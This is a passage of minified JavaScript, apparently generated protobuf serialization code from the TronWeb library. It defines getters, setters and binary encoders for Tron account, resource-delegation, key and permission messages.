            ,
            TronWebProto.Account.AccountResource.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Account.AccountResource.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Account.AccountResource.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getEnergyUsage()) && t.writeInt64(1, r),
                null != (r = e.getFrozenBalanceForEnergy()) && t.writeMessage(2, r, TronWebProto.Account.Frozen.serializeBinaryToWriter),
                0 !== (r = e.getLatestConsumeTimeForEnergy()) && t.writeInt64(3, r),
                0 !== (r = e.getAcquiredDelegatedFrozenBalanceForEnergy()) && t.writeInt64(4, r),
                0 !== (r = e.getDelegatedFrozenBalanceForEnergy()) && t.writeInt64(5, r),
                0 !== (r = e.getStorageLimit()) && t.writeInt64(6, r),
                0 !== (r = e.getStorageUsage()) && t.writeInt64(7, r),
                0 !== (r = e.getLatestExchangeStorageTime()) && t.writeInt64(8, r)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.getEnergyUsage = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.setEnergyUsage = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.getFrozenBalanceForEnergy = function() {
                return n.Message.getWrapperField(this, TronWebProto.Account.Frozen, 2)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.setFrozenBalanceForEnergy = function(e) {
                return n.Message.setWrapperField(this, 2, e)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.clearFrozenBalanceForEnergy = function() {
                return this.setFrozenBalanceForEnergy(void 0)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.hasFrozenBalanceForEnergy = function() {
                return null != n.Message.getField(this, 2)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.getLatestConsumeTimeForEnergy = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.setLatestConsumeTimeForEnergy = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.getAcquiredDelegatedFrozenBalanceForEnergy = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.setAcquiredDelegatedFrozenBalanceForEnergy = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.getDelegatedFrozenBalanceForEnergy = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.setDelegatedFrozenBalanceForEnergy = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.getStorageLimit = function() {
                return n.Message.getFieldWithDefault(this, 6, 0)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.setStorageLimit = function(e) {
                return n.Message.setProto3IntField(this, 6, e)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.getStorageUsage = function() {
                return n.Message.getFieldWithDefault(this, 7, 0)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.setStorageUsage = function(e) {
                return n.Message.setProto3IntField(this, 7, e)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.getLatestExchangeStorageTime = function() {
                return n.Message.getFieldWithDefault(this, 8, 0)
            }
            ,
            TronWebProto.Account.AccountResource.prototype.setLatestExchangeStorageTime = function(e) {
                return n.Message.setProto3IntField(this, 8, e)
            }
            ,
            TronWebProto.Account.prototype.getAccountName = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.Account.prototype.getAccountName_asB64 = function() {
                return n.Message.bytesAsB64(this.getAccountName())
            }
            ,
            TronWebProto.Account.prototype.getAccountName_asU8 = function() {
                return n.Message.bytesAsU8(this.getAccountName())
            }
            ,
            TronWebProto.Account.prototype.setAccountName = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.Account.prototype.getType = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.Account.prototype.setType = function(e) {
                return n.Message.setProto3EnumField(this, 2, e)
            }
            ,
            TronWebProto.Account.prototype.getAddress = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.Account.prototype.getAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getAddress())
            }
            ,
            TronWebProto.Account.prototype.getAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getAddress())
            }
            ,
            TronWebProto.Account.prototype.setAddress = function(e) {
                return n.Message.setProto3BytesField(this, 3, e)
            }
            ,
            TronWebProto.Account.prototype.getBalance = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.Account.prototype.setBalance = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            TronWebProto.Account.prototype.getVotesList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.Vote, 5)
            }
            ,
            TronWebProto.Account.prototype.setVotesList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 5, e)
            }
            ,
            TronWebProto.Account.prototype.addVotes = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 5, e, TronWebProto.Vote, t)
            }
            ,
            TronWebProto.Account.prototype.clearVotesList = function() {
                return this.setVotesList([])
            }
            ,
            TronWebProto.Account.prototype.getAssetMap = function(e) {
                return n.Message.getMapField(this, 6, e, null)
            }
            ,
            TronWebProto.Account.prototype.clearAssetMap = function() {
                return this.getAssetMap().clear(),
                this
            }
            ,
            TronWebProto.Account.prototype.getAssetv2Map = function(e) {
                return n.Message.getMapField(this, 56, e, null)
            }
            ,
            TronWebProto.Account.prototype.clearAssetv2Map = function() {
                return this.getAssetv2Map().clear(),
                this
            }
            ,
            TronWebProto.Account.prototype.getFrozenList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.Account.Frozen, 7)
            }
            ,
            TronWebProto.Account.prototype.setFrozenList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 7, e)
            }
            ,
            TronWebProto.Account.prototype.addFrozen = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 7, e, TronWebProto.Account.Frozen, t)
            }
            ,
            TronWebProto.Account.prototype.clearFrozenList = function() {
                return this.setFrozenList([])
            }
            ,
            TronWebProto.Account.prototype.getNetUsage = function() {
                return n.Message.getFieldWithDefault(this, 8, 0)
            }
            ,
            TronWebProto.Account.prototype.setNetUsage = function(e) {
                return n.Message.setProto3IntField(this, 8, e)
            }
            ,
            TronWebProto.Account.prototype.getAcquiredDelegatedFrozenBalanceForBandwidth = function() {
                return n.Message.getFieldWithDefault(this, 41, 0)
            }
            ,
            TronWebProto.Account.prototype.setAcquiredDelegatedFrozenBalanceForBandwidth = function(e) {
                return n.Message.setProto3IntField(this, 41, e)
            }
            ,
            TronWebProto.Account.prototype.getDelegatedFrozenBalanceForBandwidth = function() {
                return n.Message.getFieldWithDefault(this, 42, 0)
            }
            ,
            TronWebProto.Account.prototype.setDelegatedFrozenBalanceForBandwidth = function(e) {
                return n.Message.setProto3IntField(this, 42, e)
            }
            ,
            TronWebProto.Account.prototype.getOldTronPower = function() {
                return n.Message.getFieldWithDefault(this, 46, 0)
            }
            ,
            TronWebProto.Account.prototype.setOldTronPower = function(e) {
                return n.Message.setProto3IntField(this, 46, e)
            }
            ,
            TronWebProto.Account.prototype.getTronPower = function() {
                return n.Message.getWrapperField(this, TronWebProto.Account.Frozen, 47)
            }
            ,
            TronWebProto.Account.prototype.setTronPower = function(e) {
                return n.Message.setWrapperField(this, 47, e)
            }
            ,
            TronWebProto.Account.prototype.clearTronPower = function() {
                return this.setTronPower(void 0)
            }
            ,
            TronWebProto.Account.prototype.hasTronPower = function() {
                return null != n.Message.getField(this, 47)
            }
            ,
            TronWebProto.Account.prototype.getAssetOptimized = function() {
                return n.Message.getBooleanFieldWithDefault(this, 60, !1)
            }
            ,
            TronWebProto.Account.prototype.setAssetOptimized = function(e) {
                return n.Message.setProto3BooleanField(this, 60, e)
            }
            ,
            TronWebProto.Account.prototype.getCreateTime = function() {
                return n.Message.getFieldWithDefault(this, 9, 0)
            }
            ,
            TronWebProto.Account.prototype.setCreateTime = function(e) {
                return n.Message.setProto3IntField(this, 9, e)
            }
            ,
            TronWebProto.Account.prototype.getLatestOprationTime = function() {
                return n.Message.getFieldWithDefault(this, 10, 0)
            }
            ,
            TronWebProto.Account.prototype.setLatestOprationTime = function(e) {
                return n.Message.setProto3IntField(this, 10, e)
            }
            ,
            TronWebProto.Account.prototype.getAllowance = function() {
                return n.Message.getFieldWithDefault(this, 11, 0)
            }
            ,
            TronWebProto.Account.prototype.setAllowance = function(e) {
                return n.Message.setProto3IntField(this, 11, e)
            }
            ,
            TronWebProto.Account.prototype.getLatestWithdrawTime = function() {
                return n.Message.getFieldWithDefault(this, 12, 0)
            }
            ,
            TronWebProto.Account.prototype.setLatestWithdrawTime = function(e) {
                return n.Message.setProto3IntField(this, 12, e)
            }
            ,
            TronWebProto.Account.prototype.getCode = function() {
                return n.Message.getFieldWithDefault(this, 13, "")
            }
            ,
            TronWebProto.Account.prototype.getCode_asB64 = function() {
                return n.Message.bytesAsB64(this.getCode())
            }
            ,
            TronWebProto.Account.prototype.getCode_asU8 = function() {
                return n.Message.bytesAsU8(this.getCode())
            }
            ,
            TronWebProto.Account.prototype.setCode = function(e) {
                return n.Message.setProto3BytesField(this, 13, e)
            }
            ,
            TronWebProto.Account.prototype.getIsWitness = function() {
                return n.Message.getBooleanFieldWithDefault(this, 14, !1)
            }
            ,
            TronWebProto.Account.prototype.setIsWitness = function(e) {
                return n.Message.setProto3BooleanField(this, 14, e)
            }
            ,
            TronWebProto.Account.prototype.getIsCommittee = function() {
                return n.Message.getBooleanFieldWithDefault(this, 15, !1)
            }
            ,
            TronWebProto.Account.prototype.setIsCommittee = function(e) {
                return n.Message.setProto3BooleanField(this, 15, e)
            }
            ,
            TronWebProto.Account.prototype.getFrozenSupplyList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.Account.Frozen, 16)
            }
            ,
            TronWebProto.Account.prototype.setFrozenSupplyList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 16, e)
            }
            ,
            TronWebProto.Account.prototype.addFrozenSupply = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 16, e, TronWebProto.Account.Frozen, t)
            }
            ,
            TronWebProto.Account.prototype.clearFrozenSupplyList = function() {
                return this.setFrozenSupplyList([])
            }
            ,
            TronWebProto.Account.prototype.getAssetIssuedName = function() {
                return n.Message.getFieldWithDefault(this, 17, "")
            }
            ,
            TronWebProto.Account.prototype.getAssetIssuedName_asB64 = function() {
                return n.Message.bytesAsB64(this.getAssetIssuedName())
            }
            ,
            TronWebProto.Account.prototype.getAssetIssuedName_asU8 = function() {
                return n.Message.bytesAsU8(this.getAssetIssuedName())
            }
            ,
            TronWebProto.Account.prototype.setAssetIssuedName = function(e) {
                return n.Message.setProto3BytesField(this, 17, e)
            }
            ,
            TronWebProto.Account.prototype.getAssetIssuedId = function() {
                return n.Message.getFieldWithDefault(this, 57, "")
            }
            ,
            TronWebProto.Account.prototype.getAssetIssuedId_asB64 = function() {
                return n.Message.bytesAsB64(this.getAssetIssuedId())
            }
            ,
            TronWebProto.Account.prototype.getAssetIssuedId_asU8 = function() {
                return n.Message.bytesAsU8(this.getAssetIssuedId())
            }
            ,
            TronWebProto.Account.prototype.setAssetIssuedId = function(e) {
                return n.Message.setProto3BytesField(this, 57, e)
            }
            ,
            TronWebProto.Account.prototype.getLatestAssetOperationTimeMap = function(e) {
                return n.Message.getMapField(this, 18, e, null)
            }
            ,
            TronWebProto.Account.prototype.clearLatestAssetOperationTimeMap = function() {
                return this.getLatestAssetOperationTimeMap().clear(),
                this
            }
            ,
            TronWebProto.Account.prototype.getLatestAssetOperationTimev2Map = function(e) {
                return n.Message.getMapField(this, 58, e, null)
            }
            ,
            TronWebProto.Account.prototype.clearLatestAssetOperationTimev2Map = function() {
                return this.getLatestAssetOperationTimev2Map().clear(),
                this
            }
            ,
            TronWebProto.Account.prototype.getFreeNetUsage = function() {
                return n.Message.getFieldWithDefault(this, 19, 0)
            }
            ,
            TronWebProto.Account.prototype.setFreeNetUsage = function(e) {
                return n.Message.setProto3IntField(this, 19, e)
            }
            ,
            TronWebProto.Account.prototype.getFreeAssetNetUsageMap = function(e) {
                return n.Message.getMapField(this, 20, e, null)
            }
            ,
            TronWebProto.Account.prototype.clearFreeAssetNetUsageMap = function() {
                return this.getFreeAssetNetUsageMap().clear(),
                this
            }
            ,
            TronWebProto.Account.prototype.getFreeAssetNetUsagev2Map = function(e) {
                return n.Message.getMapField(this, 59, e, null)
            }
            ,
            TronWebProto.Account.prototype.clearFreeAssetNetUsagev2Map = function() {
                return this.getFreeAssetNetUsagev2Map().clear(),
                this
            }
            ,
            TronWebProto.Account.prototype.getLatestConsumeTime = function() {
                return n.Message.getFieldWithDefault(this, 21, 0)
            }
            ,
            TronWebProto.Account.prototype.setLatestConsumeTime = function(e) {
                return n.Message.setProto3IntField(this, 21, e)
            }
            ,
            TronWebProto.Account.prototype.getLatestConsumeFreeTime = function() {
                return n.Message.getFieldWithDefault(this, 22, 0)
            }
            ,
            TronWebProto.Account.prototype.setLatestConsumeFreeTime = function(e) {
                return n.Message.setProto3IntField(this, 22, e)
            }
            ,
            TronWebProto.Account.prototype.getAccountId = function() {
                return n.Message.getFieldWithDefault(this, 23, "")
            }
            ,
            TronWebProto.Account.prototype.getAccountId_asB64 = function() {
                return n.Message.bytesAsB64(this.getAccountId())
            }
            ,
            TronWebProto.Account.prototype.getAccountId_asU8 = function() {
                return n.Message.bytesAsU8(this.getAccountId())
            }
            ,
            TronWebProto.Account.prototype.setAccountId = function(e) {
                return n.Message.setProto3BytesField(this, 23, e)
            }
            ,
            TronWebProto.Account.prototype.getAccountResource = function() {
                return n.Message.getWrapperField(this, TronWebProto.Account.AccountResource, 26)
            }
            ,
            TronWebProto.Account.prototype.setAccountResource = function(e) {
                return n.Message.setWrapperField(this, 26, e)
            }
            ,
            TronWebProto.Account.prototype.clearAccountResource = function() {
                return this.setAccountResource(void 0)
            }
            ,
            TronWebProto.Account.prototype.hasAccountResource = function() {
                return null != n.Message.getField(this, 26)
            }
            ,
            TronWebProto.Account.prototype.getCodehash = function() {
                return n.Message.getFieldWithDefault(this, 30, "")
            }
            ,
            TronWebProto.Account.prototype.getCodehash_asB64 = function() {
                return n.Message.bytesAsB64(this.getCodehash())
            }
            ,
            TronWebProto.Account.prototype.getCodehash_asU8 = function() {
                return n.Message.bytesAsU8(this.getCodehash())
            }
            ,
            TronWebProto.Account.prototype.setCodehash = function(e) {
                return n.Message.setProto3BytesField(this, 30, e)
            }
            ,
            TronWebProto.Account.prototype.getOwnerPermission = function() {
                return n.Message.getWrapperField(this, TronWebProto.Permission, 31)
            }
            ,
            TronWebProto.Account.prototype.setOwnerPermission = function(e) {
                return n.Message.setWrapperField(this, 31, e)
            }
            ,
            TronWebProto.Account.prototype.clearOwnerPermission = function() {
                return this.setOwnerPermission(void 0)
            }
            ,
            TronWebProto.Account.prototype.hasOwnerPermission = function() {
                return null != n.Message.getField(this, 31)
            }
            ,
            TronWebProto.Account.prototype.getWitnessPermission = function() {
                return n.Message.getWrapperField(this, TronWebProto.Permission, 32)
            }
            ,
            TronWebProto.Account.prototype.setWitnessPermission = function(e) {
                return n.Message.setWrapperField(this, 32, e)
            }
            ,
            TronWebProto.Account.prototype.clearWitnessPermission = function() {
                return this.setWitnessPermission(void 0)
            }
            ,
            TronWebProto.Account.prototype.hasWitnessPermission = function() {
                return null != n.Message.getField(this, 32)
            }
            ,
            TronWebProto.Account.prototype.getActivePermissionList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.Permission, 33)
            }
            ,
            TronWebProto.Account.prototype.setActivePermissionList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 33, e)
            }
            ,
            TronWebProto.Account.prototype.addActivePermission = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 33, e, TronWebProto.Permission, t)
            }
            ,
            TronWebProto.Account.prototype.clearActivePermissionList = function() {
                return this.setActivePermissionList([])
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Key.prototype.toObject = function(e) {
                return TronWebProto.Key.toObject(e, this)
            }
            ,
            TronWebProto.Key.toObject = function(e, t) {
                var r = {
                    address: t.getAddress_asB64(),
                    weight: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.Key.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Key;
                return TronWebProto.Key.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Key.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setWeight(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Key.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Key.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Key.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getWeight()) && t.writeInt64(2, r)
            }
            ,
            TronWebProto.Key.prototype.getAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.Key.prototype.getAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getAddress())
            }
            ,
            TronWebProto.Key.prototype.getAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getAddress())
            }
            ,
            TronWebProto.Key.prototype.setAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.Key.prototype.getWeight = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.Key.prototype.setWeight = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.DelegatedResource.prototype.toObject = function(e) {
                return TronWebProto.DelegatedResource.toObject(e, this)
            }
            ,
            TronWebProto.DelegatedResource.toObject = function(e, t) {
                var r = {
                    from: t.getFrom_asB64(),
                    to: t.getTo_asB64(),
                    frozenBalanceForBandwidth: n.Message.getFieldWithDefault(t, 3, 0),
                    frozenBalanceForEnergy: n.Message.getFieldWithDefault(t, 4, 0),
                    expireTimeForBandwidth: n.Message.getFieldWithDefault(t, 5, 0),
                    expireTimeForEnergy: n.Message.getFieldWithDefault(t, 6, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.DelegatedResource.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.DelegatedResource;
                return TronWebProto.DelegatedResource.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.DelegatedResource.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setFrom(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setTo(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setFrozenBalanceForBandwidth(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setFrozenBalanceForEnergy(r);
                        break;
                    case 5:
                        r = t.readInt64();
                        e.setExpireTimeForBandwidth(r);
                        break;
                    case 6:
                        r = t.readInt64();
                        e.setExpireTimeForEnergy(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.DelegatedResource.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.DelegatedResource.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.DelegatedResource.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getFrom_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getTo_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getFrozenBalanceForBandwidth()) && t.writeInt64(3, r),
                0 !== (r = e.getFrozenBalanceForEnergy()) && t.writeInt64(4, r),
                0 !== (r = e.getExpireTimeForBandwidth()) && t.writeInt64(5, r),
                0 !== (r = e.getExpireTimeForEnergy()) && t.writeInt64(6, r)
            }
            ,
            TronWebProto.DelegatedResource.prototype.getFrom = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.DelegatedResource.prototype.getFrom_asB64 = function() {
                return n.Message.bytesAsB64(this.getFrom())
            }
            ,
            TronWebProto.DelegatedResource.prototype.getFrom_asU8 = function() {
                return n.Message.bytesAsU8(this.getFrom())
            }
            ,
            TronWebProto.DelegatedResource.prototype.setFrom = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.DelegatedResource.prototype.getTo = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.DelegatedResource.prototype.getTo_asB64 = function() {
                return n.Message.bytesAsB64(this.getTo())
            }
            ,
            TronWebProto.DelegatedResource.prototype.getTo_asU8 = function() {
                return n.Message.bytesAsU8(this.getTo())
            }
            ,
            TronWebProto.DelegatedResource.prototype.setTo = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.DelegatedResource.prototype.getFrozenBalanceForBandwidth = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.DelegatedResource.prototype.setFrozenBalanceForBandwidth = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.DelegatedResource.prototype.getFrozenBalanceForEnergy = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.DelegatedResource.prototype.setFrozenBalanceForEnergy = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            TronWebProto.DelegatedResource.prototype.getExpireTimeForBandwidth = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.DelegatedResource.prototype.setExpireTimeForBandwidth = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            TronWebProto.DelegatedResource.prototype.getExpireTimeForEnergy = function() {
                return n.Message.getFieldWithDefault(this, 6, 0)
            }
            ,
            TronWebProto.DelegatedResource.prototype.setExpireTimeForEnergy = function(e) {
                return n.Message.setProto3IntField(this, 6, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.authority.prototype.toObject = function(e) {
                return TronWebProto.authority.toObject(e, this)
            }
            ,
            TronWebProto.authority.toObject = function(e, t) {
                var r, n = {
                    account: (r = t.getAccount()) && TronWebProto.AccountId.toObject(e, r),
                    permissionName: t.getPermissionName_asB64()
                };
                return e && (n.$jspbMessageInstance = t),
                n
            }
            ),
            TronWebProto.authority.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.authority;
                return TronWebProto.authority.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.authority.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = new TronWebProto.AccountId;
                        t.readMessage(r, TronWebProto.AccountId.deserializeBinaryFromReader),
                        e.setAccount(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setPermissionName(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.authority.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.authority.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.authority.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                null != (r = e.getAccount()) && t.writeMessage(1, r, TronWebProto.AccountId.serializeBinaryToWriter),
                (r = e.getPermissionName_asU8()).length > 0 && t.writeBytes(2, r)
            }
            ,
            TronWebProto.authority.prototype.getAccount = function() {
                return n.Message.getWrapperField(this, TronWebProto.AccountId, 1)
            }
            ,
            TronWebProto.authority.prototype.setAccount = function(e) {
                return n.Message.setWrapperField(this, 1, e)
            }
            ,
            TronWebProto.authority.prototype.clearAccount = function() {
                return this.setAccount(void 0)
            }
            ,
            TronWebProto.authority.prototype.hasAccount = function() {
                return null != n.Message.getField(this, 1)
            }
            ,
            TronWebProto.authority.prototype.getPermissionName = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.authority.prototype.getPermissionName_asB64 = function() {
                return n.Message.bytesAsB64(this.getPermissionName())
            }
            ,
            TronWebProto.authority.prototype.getPermissionName_asU8 = function() {
                return n.Message.bytesAsU8(this.getPermissionName())
            }
            ,
            TronWebProto.authority.prototype.setPermissionName = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.Permission.repeatedFields_ = [7],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Permission.prototype.toObject = function(e) {
                return TronWebProto.Permission.toObject(e, this)
            }
            ,
            TronWebProto.Permission.toObject = function(e, t) {
                var r = {
                    type: n.Message.getFieldWithDefault(t, 1, 0),
                    id: n.Message.getFieldWithDefault(t, 2, 0),
                    permissionName: n.Message.getFieldWithDefault(t, 3, ""),
                    threshold: n.Message.getFieldWithDefault(t, 4, 0),
                    parentId: n.Message.getFieldWithDefault(t, 5, 0),
                    operations: t.getOperations_asB64(),
                    keysList: n.Message.toObjectList(t.getKeysList(), TronWebProto.Key.toObject, e)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.Permission.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Permission;
                return TronWebProto.Permission.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Permission.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readEnum();
                        e.setType(r);
                        break;
                    case 2:
                        r = t.readInt32();
                        e.setId(r);
                        break;
                    case 3:
                        r = t.readString();
                        e.setPermissionName(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setThreshold(r);
                        break;
                    case 5:
                        r = t.readInt32();
                        e.setParentId(r);
                        break;
                    case 6:
                        r = t.readBytes();
                        e.setOperations(r);
                        break;
                    case 7:
                        r = new TronWebProto.Key;
                        t.readMessage(r, TronWebProto.Key.deserializeBinaryFromReader),
                        e.addKeys(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Permission.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Permission.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Permission.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getType()) && t.writeEnum(1, r),
                0 !== (r = e.getId()) && t.writeInt32(2, r),
                (r = e.getPermissionName()).length > 0 && t.writeString(3, r),
                0 !== (r = e.getThreshold()) && t.writeInt64(4, r),
                0 !== (r = e.getParentId()) && t.writeInt32(5, r),
                (r = e.getOperations_asU8()).length > 0 && t.writeBytes(6, r),
                (r = e.getKeysList()).length > 0 && t.writeRepeatedMessage(7, r, TronWebProto.Key.serializeBinaryToWriter)
            }
            ,
            TronWebProto.Permission.PermissionType = {
                OWNER: 0,
                WITNESS: 1,
                ACTIVE: 2
            },
            TronWebProto.Permission.prototype.getType = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.Permission.prototype.setType = function(e) {
                return n.Message.setProto3EnumField(this, 1, e)
            }
            ,
            TronWebProto.Permission.prototype.getId = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.Permission.prototype.setId = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.Permission.prototype.getPermissionName = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.Permission.prototype.setPermissionName = function(e) {
                return n.Message.setProto3StringField(this, 3, e)
            }
            ,
            TronWebProto.Permission.prototype.getThreshold = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.Permission.prototype.setThreshold = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            TronWebProto.Permission.prototype.getParentId = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.Permission.prototype.setParentId = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            TronWebProto.Permission.prototype.getOperations = function() {
                return n.Message.getFieldWithDefault(this, 6, "")
            }
            ,
            TronWebProto.Permission.prototype.getOperations_asB64 = function() {
                return n.Message.bytesAsB64(this.getOperations())
            }
            ,
            TronWebProto.Permission.prototype.getOperations_asU8 = function() {
                return n.Message.bytesAsU8(this.getOperations())
            }
            ,
            TronWebProto.Permission.prototype.setOperations = function(e) {
                return n.Message.setProto3BytesField(this, 6, e)
            }
            ,
            TronWebProto.Permission.prototype.getKeysList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.Key, 7)
            }
            ,
            TronWebProto.Permission.prototype.setKeysList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 7, e)
            }
            ,
            TronWebProto.Permission.prototype.addKeys = function(e, t) {
